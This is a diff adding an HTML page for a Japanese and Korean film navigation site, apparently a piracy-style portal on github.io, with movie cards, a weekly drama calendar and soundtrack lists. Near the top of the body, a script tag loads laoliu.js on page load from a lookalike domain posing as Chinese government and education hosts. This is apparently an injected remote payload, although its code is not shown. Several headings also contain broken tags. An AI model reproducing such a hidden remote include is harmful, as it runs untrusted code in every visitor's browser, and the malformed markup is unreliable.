@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>日韩电影网 - 日本电影馆 × 韩流片库 · 日影/韩剧/韩综/OST</title>
+<meta name="description" content="日韩电影网（rihanwuyedianyingwang-h5）以日系留白电影感+韩流杂志感做影视导航：日本电影馆、韩流片库、追剧日历、OST与韩综，日影/韩剧/韩综/动漫一站导航。">
+<meta name="keywords" content="日韩电影网,日本电影,韩剧,韩综,韩影,OST,追剧日历,rihanwuyedianyingwang">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --ink:#0e0e10;
+  --paper:#f6f4ef;
+  --pink:#ff7eb6;
+  --blue:#3fb8ff;
+  --purple:#9b8cff;
+  --matcha:#9be7c4;
+  --text:#16161a;
+  --dim:#6b6b73;
+  --line:rgba(0,0,0,.12);
+}
+html{scroll-behavior:smooth}
+body{
+  background:var(--paper);
+  color:var(--text);
+  font-family:"PingFang SC","Hiragino Sans","Microsoft YaHei",serif;
+  line-height:1.75;
+  overflow-x:hidden;
+}
+/* 日系颗粒 */
+body::before{content:"";position:fixed;inset:0;pointer-events:none;opacity:.05;z-index:50;background-image:radial-gradient(#000 1px,transparent 1px);background-size:4px 4px}
+a{color:inherit;text-decoration:none}
+img{display:block;max-width:100%}
+
+/* 顶栏：左日右韩 */
+.topbar{display:flex;border-bottom:2px solid var(--ink);font-size:11px;letter-spacing:3px}
+.topbar div{flex:1;padding:8px 16px;font-weight:800}
+.topbar .jp{background:var(--ink);color:var(--paper)}
+.topbar .kr{background:var(--pink);color:#fff;text-align:right}
+
+.header{max-width:1200px;margin:auto;padding:26px 18px 12px;display:flex;align-items:flex-end;justify-content:space-between;flex-wrap:wrap;gap:14px}
+.brand h1{font-size:34px;font-weight:900;letter-spacing:2px;font-family:"Songti SC",serif}
+.brand h1 .jp{color:var(--ink)}
+.brand h1 .kr{color:var(--pink)}
+.brand p{font-size:11px;letter-spacing:6px;color:var(--dim);margin-top:4px}
+.nav{display:flex;gap:6px;flex-wrap:wrap}
+.nav a{padding:8px 14px;font-size:12px;font-weight:800;border:1px solid var(--line);border-radius:999px;color:var(--dim)}
+.nav a:hover{background:var(--ink);color:var(--paper);border-color:var(--ink)}
+
+.wrap{max-width:1200px;margin:auto;padding:0 18px}
+
+/* Hero：左日文右韩杂 */
+.hero{margin-top:24px;display:grid;grid-template-columns:1.1fr .9fr;gap:0;border:2px solid var(--ink);border-radius:18px;overflow:hidden}
+@media(max-width:860px){.hero{grid-template-columns:1fr}}
+.hero-jp{padding:34px 28px;background:var(--ink);color:var(--paper);position:relative}
+.hero-jp .kanji{font-size:60px;font-weight:900;opacity:.16;position:absolute;right:18px;top:10px;font-family:"Songti SC",serif}
+.hero-jp .tag{font-size:11px;letter-spacing:5px;color:var(--matcha)}
+.hero-jp h2{font-size:38px;font-weight:900;margin:10px 0;font-family:"Songti SC",serif}
+.hero-jp p{color:#bdbdc7;font-size:14px;max-width:420px}
+.hero-jp .mini{margin-top:18px;display:flex;gap:10px;flex-wrap:wrap}
+.hero-jp .mini span{font-size:11px;border:1px solid rgba(255,255,255,.25);padding:5px 10px;border-radius:20px}
+
+.hero-kr{padding:34px 28px;background:linear-gradient(160deg,#fff,#ffe9f3);position:relative}
+.hero-kr .badge{display:inline-block;background:var(--pink);color:#fff;font-size:11px;font-weight:900;padding:5px 12px;border-radius:999px;letter-spacing:2px}
+.hero-kr h2{font-size:34px;font-weight:900;margin:10px 0;color:#d1106b}
+.hero-kr h2 em{color:var(--blue);font-style:normal}
+.hero-kr p{color:#7a5b68;font-size:14px;max-width:420px}
+.hero-kr .chips{margin-top:16px;display:flex;gap:8px;flex-wrap:wrap}
+.hero-kr .chips span{font-size:12px;font-weight:800;padding:6px 12px;border-radius:10px;background:#fff;border:1px solid var(--pink)}
+.hero-kr .chips span.b{color:var(--blue);border-color:var(--blue)}
+.hero-kr .chips span.p{color:var(--purple);border-color:var(--purple)}
+
+/* 栏目标题 */
+.section{margin-top:62px}
+.sec-head{display:flex;align-items:baseline;gap:12px;margin-bottom:20px;border-bottom:2px solid var(--ink);padding-bottom:8px}
+.sec-head .no{font-size:13px;font-weight:900;color:var(--pink)}
+.sec-head h2{font-size:26px;font-weight:900;font-family:"Songti SC",serif}
+.sec-head h2 em{color:var(--pink);font-style:normal}
+.sec-head a{margin-left:auto;font-size:12px;font-weight:800;color:var(--ink);border-bottom:2px solid var(--pink)}
+
+/* 栏目1：日本电影馆 */
+.jp-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:18px}
+.jp-card{background:#fff;border:1px solid var(--line);border-radius:14px;overflow:hidden;transition:.3s}
+.jp-card:hover{transform:translateY(-6px);box-shadow:0 14px 30px rgba(0,0,0,.12)}
+.jp-card .pic{height:280px;overflow:hidden;filter:grayscale(.25) contrast(1.05)}
+.jp-card .pic img{width:100%;height:100%;object-fit:cover}
+.jp-card:hover .pic img{transform:scale(1.05)}
+.jp-card .info{padding:14px}
+.jp-card h4{font-size:16px;font-weight:900;font-family:"Songti SC",serif}
+.jp-card p{font-size:12px;color:var(--dim);margin-top:3px}
+.jp-card .yr{font-size:11px;color:var(--pink);font-weight:800;margin-top:6px;letter-spacing:2px}
+
+/* 栏目2：韩流片库 - 杂志卡 */
+.kr-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:18px}
+.kr-card{background:#fff;border-radius:16px;overflow:hidden;border:1px solid var(--pink);position:relative}
+.kr-card .top{height:170px;background-size:cover;background-position:center;position:relative}
+.kr-card .top .flag{position:absolute;top:10px;left:10px;background:var(--pink);color:#fff;font-size:10px;font-weight:900;padding:4px 9px;border-radius:8px}
+.kr-card .top .score{position:absolute;top:10px;right:10px;background:var(--ink);color:var(--matcha);font-size:12px;font-weight:900;padding:4px 9px;border-radius:8px}
+.kr-card .body{padding:14px}
+.kr-card h4{font-size:16px;font-weight:900;color:#d1106b}
+.kr-card p{font-size:12px;color:#7a5b68;margin-top:3px}
+.kr-card .row{display:flex;gap:6px;margin-top:10px;flex-wrap:wrap}
+.kr-card .row span{font-size:10px;font-weight:800;padding:3px 8px;border-radius:6px;background:#fff0f6;color:var(--pink);border:1px solid var(--pink)}
+.kr-card .row span.b{background:#eaf6ff;color:var(--blue);border-color:var(--blue)}
+.kr-card .row span.p{background:#f1efff;color:var(--purple);border-color:var(--purple)}
+
+/* 栏目3：追剧日历 */
+.calendar{display:grid;grid-template-columns:repeat(7,1fr);gap:10px}
+@media(max-width:760px){.calendar{grid-template-columns:repeat(2,1fr)}}
+.day{border:1px solid var(--line);border-radius:12px;padding:12px;background:#fff;min-height:120px}
+.day .wd{font-size:11px;font-weight:900;color:var(--dim);letter-spacing:2px}
+.day .dt{font-size:20px;font-weight:900;margin-bottom:6px}
+.day.kr{background:linear-gradient(160deg,#fff,#ffe9f3);border-color:var(--pink)}
+.day.jp{background:#16161a;color:var(--paper);border-color:#000}
+.day.jp .wd{color:var(--matcha)}
+.day p{font-size:11px;margin-top:4px;line-height:1.4}
+.day b{color:var(--pink)}
+.day.jp b{color:var(--blue)}
+
+/* 栏目4：OST与韩综 */
+.split{display:grid;grid-template-columns:1fr 1fr;gap:18px}
+@media(max-width:760px){.split{grid-template-columns:1fr}}
+.panel{border:1px solid var(--line);border-radius:16px;padding:22px}
+.panel.kr{background:linear-gradient(150deg,#fff,#f0e9ff)}
+.panel.jp{background:#16161a;color:var(--paper)}
+.panel h4{font-size:18px;font-weight:900;margin-bottom:10px}
+.panel.kr h4 em{color:var(--purple);font-style:normal}
+.panel.jp h4 em{color:var(--matcha);font-style:normal}
+.track{display:flex;align-items:center;gap:12px;padding:10px 0;border-bottom:1px dashed var(--line)}
+.track:last-child{border-bottom:none}
+.track .play{width:34px;height:34px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;background:var(--pink);color:#fff;flex:none}
+.panel.jp .track .play{background:var(--matcha);color:#000}
+.track h5{font-size:14px;font-weight:800}
+.track p{font-size:11px;color:var(--dim)}
+.panel.jp .track p{color:#9a9aa6}
+
+/* 关于 */
+.about{border:2px solid var(--ink);border-radius:20px;padding:30px;margin-top:62px;background:#fff}
+.about h2{font-size:24px;font-weight:900;font-family:"Songti SC",serif;margin-bottom:12px}
+.about h2 em{color:var(--pink);font-style:normal}
+.about p{font-size:14px;color:var(--dim);max-width:800px;margin-bottom:10px}
+.about a{color:var(--pink);font-weight:800}
+.about .two{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:18px}
+@media(max-width:700px){.about .two{grid-template-columns:1fr}}
+.box{border:1px solid var(--line);border-radius:14px;padding:18px}
+.box.jp{background:#16161a;color:var(--paper)}
+.box.kr{background:linear-gradient(160deg,#fff,#ffe9f3)}
+.box h4{font-size:15px;font-weight:900;margin-bottom:6px}
+.box p{font-size:12px;color:var(--dim)}
+.box.jp p{color:#bdbdc7}
+
+.footer{margin-top:58px;padding:28px 18px;text-align:center;background:var(--ink);color:#cfcfd6;font-size:12px}
+.footer a{color:var(--pink);font-weight:900}
+.footer .big{font-size:30px;font-weight:900;color:var(--paper);font-family:"Songti SC",serif;margin-bottom:8px}
+.footer .big em{color:var(--pink);font-style:normal}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="topbar">
+  <div class="jp">日 ・ 静けさ / 間 / 長回し</div>
+  <div class="kr">한 ・ 서울 / 케이팝 / 케이드라마</div>
+</div>
+
+<header class="header">
+  <div class="brand">
+    <h1><span class="jp">日</span>・<span class="kr">韩</span>电影网</h1>
+    <p>JAPAN CINEMA × K-DRAMA HUB</p>
+  </div>
+  <nav class="nav">
+    <a href="#">首页</a>
+    <a href="#jp">日本电影馆</a>
+    <a href="#kr">韩流片库</a>
+    <a href="#calendar">追剧日历</a>
+    <a href="#ost">OST / 韩综</a>
+    <a href="#about">关于日韩</a>
+  </nav>
+</header>
+
+<div class="wrap">
+
+  <!-- Hero -->
+  <section class="hero">
+    <div class="hero-jp">
+      <div class="kanji">映画</div>
+      <div class="tag">日本侧 ・ 留白 / 胶片 / 长镜头</div>
+      <h2>慢一点，<br>才看得见雾</h2>
+      <p>是枝裕和的饭桌、黑泽明的雨、宫崎骏的风、滨口龙介的对话。日本电影馆不抢你时间，把“間”留给你。</p>
+      <div class="mini"><span>剧情</span><span>时代剧</span><span>动画</span><span>文艺</span><span>独立电影</span></div>
+    </div>
+    <div class="hero-kr">
+      <div class="badge">K-CONTENT ON</div>
+      <h2>首尔刚更新，<br><em>字幕</em>已经到</h2>
+      <p>月火水木金土日日更，韩剧、韩影、韩综、韩漫改编、打歌幕后全收。像翻一本会动的韩娱杂志。</p>
+      <div class="chips">
+        <span>月火剧</span><span class="b">水木剧</span><span>周末剧</span>
+        <span class="p">韩综整期</span><span>OST 榜</span><span>济州治愈</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目1：日本电影馆 -->
+  <section class="section" id="jp">
+    <div class="sec-head"><span class="no">01</span><h2>日本< em>电影馆</span></h2><a href="#">看全部日影 ›</a></div>
+    <div class="jp-grid">
+      <article class="jp-card"><div class="pic"><img src="https://images.unsplash.com/photo-1536440136628-849c177e76a1?w=400&q=80" alt="日影"></div><div class="info"><h4>步履不停</h4><p>家庭 / 夏日 / 是枝裕和式</p><div class="yr">2008 ・ 横山家</div></div></article>
+      <article class="jp-card"><div class="pic"><img src="https://images.unsplash.com/photo-1517604931442-7e0c8ed2963c?w=400&q=80" alt="时代剧"></div><div class="info"><h4>影武者</h4><p>时代剧 / 黑泽明 / 群像</p><div class="yr">1980 ・ 甲胄与雾</div></div></article>
+      <article class="jp-card"><div class="pic"><img src="https://images.unsplash.com/photo-1505664194779-8beaceb93744?w=400&q=80" alt="动画"></div><div class="info"><h4>苍鹭与少年</h4><p>动画 / 吉卜力气质 / 梦</p><div class="yr">2023 ・ 塔与门</div></div></article>
+      <article class="jp-card"><div class="pic"><img src="https://images.unsplash.com/photo-1542204165-65bf26472b9b?w=400&q=80" alt="文艺"></div><div class="info"><h4>驾驶我的车</h4><p>文艺 / 长镜头 / 契诃夫</p><div class="yr">2021 ・ 3小时流动</div></div></article>
+      <article class="jp-card"><div class="pic"><img src="https://images.unsplash.com/photo-1478720568477-152d9b164e26?w=400&q=80" alt="独立"></div><div class="info"><h4>夜空总有最大密度的蓝</h4><p>都市 / 诗 / 打工与爱</p><div class="yr">2017 ・ 东京夜班</div></div></article>
+      <article class="jp-card"><div class="pic"><img src="https://images.unsplash.com/photo-1440404653325-ab127d49abc1?w=400&q=80" alt="推理"></div><div class="info"><h4>嫌疑人X的献身</h4><p>推理 / 数学 / 牺牲</p><div class="yr">2008 ・ 石神的逻辑</div></div></article>
+    </div>
+  </section>
+
+</div>
+
+  <!-- 栏目2：韩流片库 -->
+  <section class="section" id="kr" style="max-width:1200px;margin:62px auto 0;padding:0 18px">
+    <div class="sec-head"><span class="no">02</span><h2>韩流< em>片库</span></h2><a href="#" style="border-color:var(--blue);color:var(--blue)">打开韩娱杂志 ›</a></div>
+    <div class="kr-grid">
+      <article class="kr-card"><div class="top" style="background-image:url('https://images.unsplash.com/photo-1524985069026-ddb1d3e1b1a4?w=400&q=80')"><span class="flag">韩剧</span><span class="score">9.4</span></div><div class="body"><h4>苦尽柑来遇见你</h4><p>年代 / 济州 / 女性成长</p><div class="row"><span>月火</span><span class="b">治愈</span><span class="p">济州海风</span></div></div></article>
+      <article class="kr-card"><div class="top" style="background-image:url('https://images.unsplash.com/photo-1509248961158-e54f6934749c?w=400&q=80')"><span class="flag">韩影</span><span class="score">8.8</span></div><div class="body"><h4>寄生虫</h4><p>悬疑 / 阶层 / 奉俊昊</p><div class="row"><span>黑色</span><span class="b">半地下室</span><span class="p">奥斯卡</span></div></div></article>
+      <article class="kr-card"><div class="top" style="background-image:url('https://images.unsplash.com/photo-1489593908472-4d1a72d5d1b9?w=400&q=80')"><span class="flag">韩综</span><span class="score">9.0</span></div><div class="body"><h4>出差十五夜</h4><p>谈话 / 游戏 / 罗暎锡</p><div class="row"><span>整期</span><span class="b">名场面</span><span class="p">嘉宾轮转</span></div></div></article>
+      <article class="kr-card"><div class="top" style="background-image:url('https://images.unsplash.com/photo-1514525253161-7a46d19cd819?w=400&q=80')"><span class="flag">OST</span><span class="score">♪</span></div><div class="body"><h4>眼泪的香气</h4><p>OST / 水木剧插曲 / 韩语</p><div class="row"><span>抒情</span><span class="b">钢琴</span><span class="p">榜单1位</span></div></div></article>
+      <article class="kr-card"><div class="top" style="background-image:url('https://images.unsplash.com/photo-1497032205916-ac775f0649ae?w=400&q=80')"><span class="flag">韩剧</span><span class="score">9.2</span></div><div class="body"><h4>我的解放日志</hmx>></h4><p>职场 / 首尔 / 慢治愈</p><div class="row"><span>周末</span><span class="b">社畜</span><span class="p">人生台词</span></div></article>
+      <article class="kr-card"><div class="top" style="background-image:url('https://images.unsplash.com/photo-1504384308090-c894fdcc538d?w=400&q=80')"><span class="flag">韩影</span><span class="score">8.6</span></div><div class="body"><h4>釜山行</h4><p>丧尸 / 列车 / 父女</p><div class="row"><span>动作</span><span class="b">末日</span><span class="p">高铁封闭</span></div></div></article>
+    </div>
+  </section>
+
+<div class="wrap">
+
+  <!-- 栏目3：追剧日历 -->
+  <section class="section" id="calendar">
+    <div class="sec-head"><span class="no">03</span><h2>追剧< em>日历</span></h2><a href="#">整周排期 ›</a></div>
+    <div class="calendar">
+      <div class="day jp"><div class="wd">月 MON</div><div class="dt">06</div><p>日：<b>东京塔</b> 重映</p><p>韩：月火剧 第3集</p></div>
+      <div class="day kr"><div class="wd">火 TUE</div><div class="dt">07</div><p>韩：<b>苦尽柑来</b> 更新</p><p>日：动画修复版</p></div>
+      <div class="day kr"><div class="wd">水 WED</div><div class="dt">08</div><p>韩：水木剧 双更</p><p>OST 新歌上线</p></div>
+      <div class="day jp"><div class="wd">木 THU</div><div class="dt">09</div><p>日：<b>驾驶我的车</b> 长镜头夜</p><p>韩综预告</p></div>
+      <div class="day kr"><div class="wd">金 FRI</div><div class="dt">10</div><p>韩：金土剧 开局</p><p>打歌节目精选</p></div>
+      <div class="day kr"><div class="wd">土 SAT</div><div class="dt">11</div><p>韩：周末剧 上篇</p><p>韩影 4K 修复</p></div>
+      <div class="day jp"><div class="wd">日 SUN</div><div class="dt">12</div><p>日：<b>步履不停</b> 家庭场</p><p>韩：韩综整期回看</p></div>
+    </div>
+  </section>
+
+  <!-- 栏目4：OST与韩综 -->
+  <section class="section" id="ost">
+    <div class="sec-head"><span class="no">04</span><h2>OST <em>&</em> 韩综</h2><a href="#">听榜单 ›</a></div>
+    <div class="split">
+      <div class="panel kr">
+        <h4>韩流 <em>OST 台</em></h4>
+        <div class="track"><div class="play">▶</div><div><h5>眼泪的香气</h5><p>水木剧 插曲 ・ 钢琴抒情 ・ 榜单 1 位</p></div></div>
+        <div class="track"><div class="play">▶</div><div><h5>济州的风</h5><p>年代剧 OST ・ 吉他 + 海浪采样</p></div></div>
+        <div class="track"><div class="play">▶</div><div><h5>半地下室的灯</h5><p>韩影原声 ・ 低音贝斯 ・ 阶层隐喻</p></div></div>
+        <div class="track"><div class="play">▶</div><div><h5>末班地铁</h5><p>韩综结尾曲 ・ City Pop 复古</p></div></div>
+      </div>
+      <div class="panel jp">
+        <h4>日本侧 <em>动画与配乐</em></h4>
+        <div class="track"><div class="play">▶</div><div><h5>风之通道</h5><p>吉卜力气质 ・ 久石让式弦乐</p></div></div>
+        <div class="track"><div class="play">▶</div><div><h5>夏天的尾声</h5><p>是枝式家庭片 ・ 吉他 + 蝉鸣</p></div></div>
+        <div class="track"><div class="play">▶</div><div><h5>雨夜对白</h5><p>黑泽明修复 ・ 太鼓与弦</p></div></div>
+        <div class="track"><div class="play">▶</div><div><h5>长镜头的海</h5><p>文艺片 ・ 环境音 + 钢琴</p></div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 关于 -->
+  <section class="about" id="about">
+    <h2>关于 <em>日韩电影网</em></h2>
+    <p>日韩电影网（rihanwuyedianyingwang-h5）把“日本电影的静”和“韩流的密”放在同一张纸上：左边是留白、长镜头、时代剧、吉卜力；右边是月火水木、韩综整期、OST 榜单、济州治愈。找片不用切站，心情切一下就行。</p>
+    <p>网站名称：<strong style="color:var(--pink)">日韩电影网</strong><br>
+       网站网址：<a href="https://rihanwuyedianyingwang-h5.github.io">https://rihanwuyedianyingwang-h5.github.io</a></p>
+    <div class="two">
+      <div class="box jp"><h4>日本电影馆</h4><p>剧情 / 时代剧 / 动画 / 文艺 / 独立。慢、静、留白，尊重“間”。</p></div>
+      <div class="box kr"><h4>韩流片库</h4><p>韩剧 / 韩影 / 韩综 / OST / 韩漫改编。更新快、字幕稳、情绪浓。</p></div>
+    </div>
+    <p style="margin-top:16px">本站仅做影视信息展示与导航，资源来自互联网，如有侵权请联系删除。</p>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <div class="big">日<em>・</em>韩 电影网</div>
+  <p>© 2026 日韩电影网 ｜ 网站名称：日韩电影网 ｜ 网址：<a href="https://rihanwuyedianyingwang-h5.github.io">rihanwuyedianyingwang-h5.github.io</a></p>
+  <p>日系留白 × 韩流杂志风 · 单页静态演示 · 内链 # 占位 · 未生成 robots.txt / sitemap.xml</p>
+</footer>
+
+</body>
+</html>
